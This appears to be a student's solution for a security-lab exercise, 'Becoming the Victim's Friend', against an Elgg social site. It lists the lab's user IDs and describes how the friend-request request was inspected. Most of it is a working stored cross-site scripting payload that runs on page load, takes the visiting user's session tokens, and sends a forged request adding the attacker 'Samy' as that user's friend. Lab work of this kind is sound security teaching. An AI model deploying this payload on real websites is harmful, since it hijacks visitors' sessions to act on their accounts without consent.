/* task1: Becoming the Victim’s Friend */

/*
	elgg.session.user._:
		guid: 44; name: Alice;   username: alice;
		guid: 45; name: Boby;    username: boby;
		guid: 46; name: Charlie; username: charlie;
		guid: 47; name: Samy;    username: samy;
*/

/*
	solution:
		1) A friend request was sent from one account to another one for adding the later user as frined.
		2) Then, HTTP request inspection tool of Mozilla Firefox browser was launched and an HTTP GET request corresponding to this friend request was detected.
		3) The request url and parameters sent were examined and attacking url was constructed according to its structure.
*/

<script type="text/javascript">
	window.onload = function() {
		/* accessing guid, elgg timestamp, elgg security token of the current user */
		var guid = elgg.session.user.guid;
		var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
		var token = '&__elgg_token='+elgg.security.token.__elgg_token;
	
		/* task1: constructing the HTTP GET request to add attacker Samy(guid=47) as a friend */
		var sendurl = 'http://www.xsslabelgg.com/action/friends/add?friend=47'+ts+token+ts+token;

		/* creating and sending Ajax request to add friend */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('GET', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send();
		}
	}
</script>

